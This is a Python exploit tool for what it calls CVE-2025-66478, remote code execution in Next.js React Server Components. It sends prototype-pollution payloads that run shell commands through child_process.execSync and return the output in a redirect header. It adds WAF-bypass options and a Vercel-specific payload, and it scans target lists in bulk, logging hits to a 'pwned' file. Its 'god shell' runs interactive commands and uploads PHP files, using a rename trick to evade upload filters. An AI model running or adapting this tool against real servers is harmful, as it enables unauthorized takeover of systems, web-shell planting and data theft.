import sys
import os
import json
import asyncio
import aiohttp
import random
import string
import urllib.parse
import base64
import re
from datetime import datetime

# Configuration
TIMEOUT = 10
MAX_CONCURRENT = 100
OUTPUT_DIR = "Results"

class Colors:
    GREEN = '\033[32m'
    BRIGHT_GREEN = '\033[1;92m'
    AMBER = '\033[33m'
    DARK_GREEN = '\033[2;32m'
    RED = '\033[91m'
    YELLOW = '\033[93m'
    CYAN = '\033[96m'
    MAGENTA = '\033[95m'
    BOLD = '\033[1m'
    DIM = '\033[2m'
    RESET = '\033[0m'

def print_banner():
    os.system('clear' if os.name == 'posix' else 'cls')
    banner = f"""
{Colors.BRIGHT_GREEN}{Colors.BOLD}
██████╗ ███████╗ █████╗  ██████╗████████╗██████╗ ███████╗██╗  ██╗███████╗██╗     ██╗     
██╔══██╗██╔════╝██╔══██╗██╔════╝╚══██╔══╝╚════██╗██╔════╝██║  ██║██╔════╝██║     ██║     
██████╔╝█████╗  ███████║██║        ██║    █████╔╝███████╗███████║█████╗  ██║     ██║     
██╔══██╗██╔══╝  ██╔══██║██║        ██║   ██╔═══╝ ╚════██║██╔══██║██╔══╝  ██║     ██║     
██║  ██║███████╗██║  ██║╚██████╗   ██║   ███████╗███████║██║  ██║███████╗███████╗███████╗
╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝ ╚═════╝   ╚═╝   ╚══════╝╚══════╝╚═╝  ╚═╝╚══════╝╚══════╝╚══════╝
                                                                 
                        React2Shell RCE - CVE-2025-66478
{Colors.AMBER}{Colors.BOLD}
               Next.js RSC Remote Code Execution Vulnerability
{Colors.DARK_GREEN}
          Author: Bob Marley (https://github.com/khadafigans)
{Colors.RESET}
    """
    print(banner)
    print(f"{Colors.DARK_GREEN}Loaded all original react.py payloads with WAF bypass. Ready to own everything.{Colors.RESET}\n")

def normalize_url(url: str) -> str:
    """Normalize URL - handles domain.com, http://, https://"""
    url = url.strip()
    if not url:
        return None
    if not url.startswith(("http://", "https://")):
        url = 'https://' + url
    return url.rstrip("/")

def generate_junk_data(size_kb: int = 128):
    """Generate random junk data for WAF bypass."""
    param_name = ''.join(random.choices(string.ascii_lowercase, k=12))
    junk = ''.join(random.choices(string.ascii_letters + string.digits, k=size_kb * 1024))
    return param_name, junk

def encode_unicode(data: str) -> str:
    """Encode string characters as Unicode escapes for WAF bypass."""
    result = []
    in_string = False
    i = 0
    while i < len(data):
        c = data[i]
        if c == '"':
            in_string = not in_string
            result.append(c)
        elif not in_string:
            result.append(c)
        elif c == '\\' and i + 1 < len(data):
            result.append(c)
            result.append(data[i + 1])
            i += 1
        else:
            result.append(f"\\u{ord(c):04x}")
        i += 1
    return ''.join(result)

def get_headers(content_type: str = None) -> dict:
    """Build request headers - EXACTLY like react.py"""
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        "Next-Action": "x",
        "X-Nextjs-Request-Id": f"scan-{random.randint(1000, 9999)}",
        "X-Nextjs-Html-Request-Id": "SSTMXm7OJ_g0Ncx6jpQt9",
    }
    if content_type:
        headers["Content-Type"] = content_type
    return headers

def build_safe_payload():
    """Safe payload - from react.py"""
    boundary = "----WebKitFormBoundaryx8jO2oVc6SWP3Sad"
    body = (
        f"------WebKitFormBoundaryx8jO2oVc6SWP3Sad\r\n"
        f'Content-Disposition: form-data; name="1"\r\n\r\n'
        f"{{}}\r\n"
        f"------WebKitFormBoundaryx8jO2oVc6SWP3Sad\r\n"
        f'Content-Disposition: form-data; name="0"\r\n\r\n'
        f'["$1:aa:aa"]\r\n'
        f"------WebKitFormBoundaryx8jO2oVc6SWP3Sad--"
    )
    content_type = f"multipart/form-data; boundary={boundary}"
    return body, content_type

def build_rce_payload(cmd: str, waf_bypass: bool = False, waf_bypass_size_kb: int = 128, unicode_encode: bool = False):
    """RCE payload - from react.py - EXACT FORMAT with WAF bypass support"""
    boundary = "----WebKitFormBoundaryx8jO2oVc6SWP3Sad"
    
    escaped_cmd = cmd.replace("'", "\\'")
    prefix_payload = (
        f"var res=process.mainModule.require('child_process').execSync('{escaped_cmd}')"
        f".toString().trim();;throw Object.assign(new Error('NEXT_REDIRECT'),"
        f"{{digest: `NEXT_REDIRECT;push;/login?a=${{encodeURIComponent(res)}};307;`}});"
    )

    part0 = json.dumps({
        "then": "$1:__proto__:then",
        "status": "resolved_model",
        "reason": -1,
        "value": '{"then":"$B1337"}',
        "_response": {
            "_prefix": prefix_payload,
            "_chunks": "$Q2",
            "_formData": {"get": "$1:constructor:constructor"}
        }
    })

    if unicode_encode:
        part0 = encode_unicode(part0)

    parts = []

    # Add junk data at start for WAF bypass
    if waf_bypass:
        param_name, junk = generate_junk_data(waf_bypass_size_kb)
        parts.append(
            f"------WebKitFormBoundaryx8jO2oVc6SWP3Sad\r\n"
            f'Content-Disposition: form-data; name="{param_name}"\r\n\r\n'
            f"{junk}\r\n"
        )

    parts.extend([
        f"------WebKitFormBoundaryx8jO2oVc6SWP3Sad\r\n"
        f'Content-Disposition: form-data; name="0"\r\n\r\n'
        f"{part0}\r\n",
        f"------WebKitFormBoundaryx8jO2oVc6SWP3Sad\r\n"
        f'Content-Disposition: form-data; name="1"\r\n\r\n'
        f'"$@0"\r\n',
        f"------WebKitFormBoundaryx8jO2oVc6SWP3Sad\r\n"
        f'Content-Disposition: form-data; name="2"\r\n\r\n'
        f"[]\r\n",
        "------WebKitFormBoundaryx8jO2oVc6SWP3Sad--"
    ])

    body = "".join(parts)
    content_type = f"multipart/form-data; boundary={boundary}"
    return body, content_type

def build_vercel_bypass_payload() -> tuple:
    """Build Vercel-specific WAF bypass payload."""
    boundary = "----WebKitFormBoundaryx8jO2oVc6SWP3Sad"

    part0 = (
        '{"then":"$1:__proto__:then","status":"resolved_model","reason":-1,'
        '"value":"{\\"then\\":\\"$B1337\\"}","_response":{"_prefix":'
        '"var res=process.mainModule.require(\'child_process\').execSync(\'id\').toString().trim();;'
        'throw Object.assign(new Error(\'NEXT_REDIRECT\'),{digest: `NEXT_REDIRECT;push;/login?a=${encodeURIComponent(res)};307;`});",'
        '"_chunks":"$Q2","_formData":{"get":"$3:\\"$$:constructor:constructor"}}}'
    )

    body = (
        f"------WebKitFormBoundaryx8jO2oVc6SWP3Sad\r\n"
        f'Content-Disposition: form-data; name="0"\r\n\r\n'
        f"{part0}\r\n"
        f"------WebKitFormBoundaryx8jO2oVc6SWP3Sad\r\n"
        f'Content-Disposition: form-data; name="1"\r\n\r\n'
        f'"$@0"\r\n'
        f"------WebKitFormBoundaryx8jO2oVc6SWP3Sad\r\n"
        f'Content-Disposition: form-data; name="2"\r\n\r\n'
        f"[]\r\n"
        f"------WebKitFormBoundaryx8jO2oVc6SWP3Sad\r\n"
        f'Content-Disposition: form-data; name="3"\r\n\r\n'
        f'{{"\\"\\u0024\\u0024":{{}}}}\r\n'
        f"------WebKitFormBoundaryx8jO2oVc6SWP3Sad--"
    )

    content_type = f"multipart/form-data; boundary={boundary}"
    return body, content_type

async def send_payload(session, url, body, content_type):
    """Send payload - EXACTLY like react.py"""
    try:
        headers = get_headers(content_type)
        post_url = f"{url}/"
        
        async with session.post(
            post_url,
            data=body.encode('utf-8'),
            headers=headers,
            timeout=aiohttp.ClientTimeout(total=TIMEOUT),
            allow_redirects=False,
            ssl=False
        ) as resp:
            text = await resp.text()
            redirect = resp.headers.get("X-Action-Redirect", "")
            return resp.status, redirect, text
    except Exception as e:
        return None, '', str(e)

async def detect_safe(session, url):
    """Detect vulnerability"""
    body, content_type = build_safe_payload()
    status, redirect, text = await send_payload(session, url, body, content_type)
    
    if status == 500 and 'E{"digest"' in text:
        return True
    return False

async def exploit_rce(session, url, cmd, waf_bypass: bool = False, waf_bypass_size_kb: int = 128, unicode_encode: bool = False, vercel_bypass: bool = False):
    """Execute command and get output with WAF bypass support"""
    if vercel_bypass:
        body, content_type = build_vercel_bypass_payload()
    else:
        body, content_type = build_rce_payload(cmd, waf_bypass=waf_bypass, waf_bypass_size_kb=waf_bypass_size_kb, unicode_encode=unicode_encode)
    
    status, redirect, text = await send_payload(session, url, body, content_type)
    
    if redirect:
        match = re.search(r'[?&]a=([^&;]+)', redirect)
        if match:
            output = urllib.parse.unquote(match.group(1))
            return True, output
    
    return False, "No output"

async def upload_file(session, url, local_file, remote_path, file_type="php", waf_bypass: bool = False, waf_bypass_size_kb: int = 128):
    """
    Upload file to target using three methods:
    - file_type="php": Direct PHP file upload with chmod 755
    - file_type="txt_to_php": Upload as TXT then rename to PHP (bypass filters)
    - file_type="bin": Binary file upload
    """
    if not os.path.isfile(local_file):
        return False, f"{Colors.RED}File not found: {local_file}{Colors.RESET}"
    
    try:
        with open(local_file, 'rb') as f:
            content = base64.b64encode(f.read()).decode()
    except Exception as e:
        return False, f"{Colors.RED}Failed to read file: {str(e)}{Colors.RESET}"
    
    # Build command based on file type
    if file_type == "php":
        cmd = f"echo '{content}' | base64 -d > {remote_path} && chmod 755 {remote_path}"
    elif file_type == "txt_to_php":
        txt_path = remote_path + ".txt"
        cmd = f"echo '{content}' | base64 -d > {txt_path} && mv {txt_path} {remote_path}"
    elif file_type == "bin":
        cmd = f"echo '{content}' | base64 -d > {remote_path}"
    else:
        return False, f"{Colors.RED}Unknown file type: {file_type}{Colors.RESET}"
    
    success, output = await exploit_rce(session, url, cmd, waf_bypass=waf_bypass, waf_bypass_size_kb=waf_bypass_size_kb)
    
    if success or "No output" in output:
        file_url = url + remote_path
        return True, f"{Colors.BRIGHT_GREEN}[+] Uploaded: {local_file} → {remote_path}\n[+] URL: {file_url}{Colors.RESET}"
    else:
        return False, f"{Colors.RED}Upload failed: {output}{Colors.RESET}"

async def god_shell(session, url, waf_bypass: bool = False, waf_bypass_size_kb: int = 128, unicode_encode: bool = False):
    """Interactive shell with upload support and WAF bypass options"""
    print(f"\n{Colors.BRIGHT_GREEN}{Colors.BOLD}[GOD SHELL ACTIVE] {url} fully owned{Colors.RESET}")
    print(f"{Colors.DARK_GREEN}WAF Bypass: {'ON' if waf_bypass else 'OFF'} | Unicode Encode: {'ON' if unicode_encode else 'OFF'}{Colors.RESET}")
    print(f"{Colors.DARK_GREEN}Type 'help' for commands. 'exit' to quit.{Colors.RESET}\n")
    
    while True:
        try:
            domain = url.split('//')[1][:30]
            cmd = input(f"{Colors.BRIGHT_GREEN}pwned@{domain}> {Colors.RESET}").strip()
            
            if not cmd:
                continue
            
            if cmd.lower() == 'exit' or cmd.lower() == 'quit':
                break
            
            if cmd == 'clear':
                os.system('clear' if os.name == 'posix' else 'cls')
                continue
            
            if cmd == 'help':
                print(f"""{Colors.CYAN}
╔════════════════════════════════════════════════════════╗
║           AVAILABLE COMMANDS                           ║
╠════════════════════════════════════════════════════════╣
║  Shell Commands:                                       ║
║    • Any system command (ls, whoami, id, cat, etc.)    ║
║                                                        ║
║  File Upload Commands:                                 ║
║    • upload <local> <remote>                           ║
║      Upload and execute PHP file directly              ║
║                                                        ║
║    • upload_txt <local> <remote>                       ║
║      Upload as TXT then rename to final name           ║
║      Bypasses .php upload restrictions                 ║
║                                                        ║
║    • upload_bin <local> <remote>                       ║
║      Upload binary file (no permissions)               ║
║                                                        ║
║  System Commands:                                      ║
║    • help - Show this help                             ║
║    • exit/quit - Exit shell                            ║
╚════════════════════════════════════════════════════════╝
{Colors.RESET}""")
                continue
            
            if cmd.startswith('upload_txt '):
                parts = cmd.split(maxsplit=2)
                if len(parts) < 3:
                    print(f"{Colors.RED}Usage: upload_txt <local> <remote>{Colors.RESET}")
                    continue
                local = parts[1]
                remote = parts[2]
                success, msg = await upload_file(session, url, local, remote, file_type="txt_to_php", waf_bypass=waf_bypass, waf_bypass_size_kb=waf_bypass_size_kb)
                print(msg)
                continue
            
            if cmd.startswith('upload_bin '):
                parts = cmd.split(maxsplit=2)
                if len(parts) < 3:
                    print(f"{Colors.RED}Usage: upload_bin <local> <remote>{Colors.RESET}")
                    continue
                local = parts[1]
                remote = parts[2]
                success, msg = await upload_file(session, url, local, remote, file_type="bin", waf_bypass=waf_bypass, waf_bypass_size_kb=waf_bypass_size_kb)
                print(msg)
                continue
            
            if cmd.startswith('upload '):
                parts = cmd.split(maxsplit=2)
                if len(parts) < 3:
                    print(f"{Colors.RED}Usage: upload <local> <remote>{Colors.RESET}")
                    continue
                local = parts[1]
                remote = parts[2]
                success, msg = await upload_file(session, url, local, remote, file_type="php", waf_bypass=waf_bypass, waf_bypass_size_kb=waf_bypass_size_kb)
                print(msg)
                continue
            
            print(f"{Colors.DARK_GREEN}[*] Running: {cmd}{Colors.RESET}")
            success, out = await exploit_rce(session, url, cmd, waf_bypass=waf_bypass, waf_bypass_size_kb=waf_bypass_size_kb, unicode_encode=unicode_encode)
            print(f"{Colors.BRIGHT_GREEN if success else Colors.RED}{out}{Colors.RESET}")
        
        except KeyboardInterrupt:
            print(f"\n{Colors.YELLOW}[!] Interrupted by user{Colors.RESET}")
            break
        except Exception as e:
            print(f"{Colors.RED}[ERROR] {str(e)}{Colors.RESET}")

async def main():
    print_banner()

    target_input = input(f"{Colors.AMBER}[+] Targets (URL or file): {Colors.RESET}").strip()
    targets = []
    if os.path.isfile(target_input):
        with open(target_input) as f:
            targets = [l.strip() for l in f if l.strip() and not l.startswith('#')]
    else:
        targets = [target_input]

    mode = input(f"{Colors.AMBER}[+] Mode (1=Detect 2=PoC 3=Custom Cmd 4=God Shell) [4]: {Colors.RESET}").strip() or "4"
    
    # WAF Bypass Options
    waf_bypass = input(f"{Colors.AMBER}[+] Enable WAF bypass? (y/n) [n]: {Colors.RESET}").strip().lower() == 'y'
    waf_bypass_size_kb = 128
    if waf_bypass:
        size_input = input(f"{Colors.AMBER}[+] Junk data size in KB (default 128): {Colors.RESET}").strip()
        if size_input.isdigit():
            waf_bypass_size_kb = int(size_input)
    
    unicode_encode = input(f"{Colors.AMBER}[+] Enable Unicode encoding? (y/n) [n]: {Colors.RESET}").strip().lower() == 'y'
    vercel_bypass = input(f"{Colors.AMBER}[+] Enable Vercel bypass? (y/n) [n]: {Colors.RESET}").strip().lower() == 'y'

    os.makedirs(OUTPUT_DIR, exist_ok=True)
    ts = datetime.now().strftime("%Y%m%d_%H%M")
    hits_file = f"{OUTPUT_DIR}/pwned_{ts}.txt"

    connector = aiohttp.TCPConnector(limit=MAX_CONCURRENT, ssl=False)
    async with aiohttp.ClientSession(connector=connector, timeout=aiohttp.ClientTimeout(total=TIMEOUT)) as session:
        hits = 0
        for raw_url in targets:
            url = normalize_url(raw_url)
            if not url:
                continue
                
            print(f"\n{Colors.CYAN}[*] Targeting: {url}{Colors.RESET}")

            if await detect_safe(session, url):
                print(f"{Colors.BRIGHT_GREEN}{Colors.BOLD}[VULNERABLE] Safe detection confirmed!{Colors.RESET}")
                with open(hits_file, 'a') as f:
                    f.write(f"VULN: {url}\n")
                hits += 1

                if mode == "1":
                    continue
                if mode == "2":
                    success, out = await exploit_rce(session, url, "id", waf_bypass=waf_bypass, waf_bypass_size_kb=waf_bypass_size_kb, unicode_encode=unicode_encode, vercel_bypass=vercel_bypass)
                    print(f"{Colors.BRIGHT_GREEN}PoC: {out}{Colors.RESET}")
                    continue
                if mode == "3":
                    cmd = input(f"{Colors.AMBER}[+] Command: {Colors.RESET}")
                    if cmd:
                        success, out = await exploit_rce(session, url, cmd, waf_bypass=waf_bypass, waf_bypass_size_kb=waf_bypass_size_kb, unicode_encode=unicode_encode, vercel_bypass=vercel_bypass)
                        print(f"{Colors.BRIGHT_GREEN if success else Colors.RED}{out}{Colors.RESET}")
                    continue
                if mode == "4":
                    await god_shell(session, url, waf_bypass=waf_bypass, waf_bypass_size_kb=waf_bypass_size_kb, unicode_encode=unicode_encode)
            else:
                print(f"{Colors.YELLOW}[SAFE] Patched or blocked{Colors.RESET}")

        print(f"\n{Colors.BRIGHT_GREEN}[DONE] {hits} vulnerable - Hits: {hits_file}{Colors.RESET}")

if __name__ == '__main__':
    asyncio.run(main())
